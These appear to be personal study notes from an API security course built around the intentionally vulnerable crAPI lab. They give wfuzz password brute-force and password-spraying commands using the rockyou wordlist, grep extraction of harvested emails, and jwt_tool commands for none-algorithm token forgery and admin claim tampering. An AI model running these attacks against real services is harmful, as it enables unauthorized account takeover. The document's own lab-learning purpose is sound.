
	#Classical Authentication Attacks# 
	
		#brute-force
		
		its like brute-force and password spraying. to perfrom the attack, need to leverage the information revealed in an excessive data exposure vulnerability.
		the excess data could reveal technical details about the users account like user is using multifactor authentication.

		capture the login username and password. send it to intruder and check STATUS and LENGTH (if username match length size may vary/change) 

		https://github.com/sc0tfree/mentalist
		https://github.com/Mebus/cupp
		https://github.com/rockyou.txt

		wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' -H 'Content-Type: application/json' -z file,/usr/share/wordlists/rockyou.txt -u http://127.0.0.1:8888/identity/api/auth/login --hc 405

  
  		#password-spraying#
		
		many security controls could prevent you from successfully brute-forcing an API authentication. a technique called "Password Spraying" that can evade.
		collection username or email address from post-comment which is "excessive-data-exposure"
				
				crapi.apisec.ai/community/api/v2/community/posts/recent		|| save all outputs to response.json files then filter for email
							
		save the response (below save to file) of post-comment and other targeted files and filter email address using grep
				grep -oe "[a-zA-Z0-9._]\+@[a-zA-Z]\+.[a-zA-Z]\+" response.json
		
		after getting email address, match password with rockyou.txt for brute-force attack.
			
	
		#Note on Base64 Encoding#
			some APIs will base64-encode authentication payloads sent in an API request.



	#API Token Attacks#
    
		[Token Analysis] 
	
		login using username and password using Postman, capture the request and send it to sequsencer 
			live capture
				
				token location within response
					custom location: select the jwt token
			
			start live-capture > auto analyze
			
			
		[JWT Attacks]

			echo eyJfsaf1Mijvsdv|base64 -d			header | payload | security
				{"alg": "HS512", "typ": "JWT"}
				
			
			jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
						show token output
				
					
			jwt_tool -t https://exampl.com/identity/api/v2/user/dashbard -rh "Authorization: Bearer JWT-TOKEN" -M pb
		
			jwt_tool -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3OD -X a 
					
					this will create new JWT Token with none:alg and signature
					attempt login with this token
					
			edit header token to root/admin and update token.
			
			
			
		
    
    
    
    
    
    
    
    
    
    
    
    
    
    
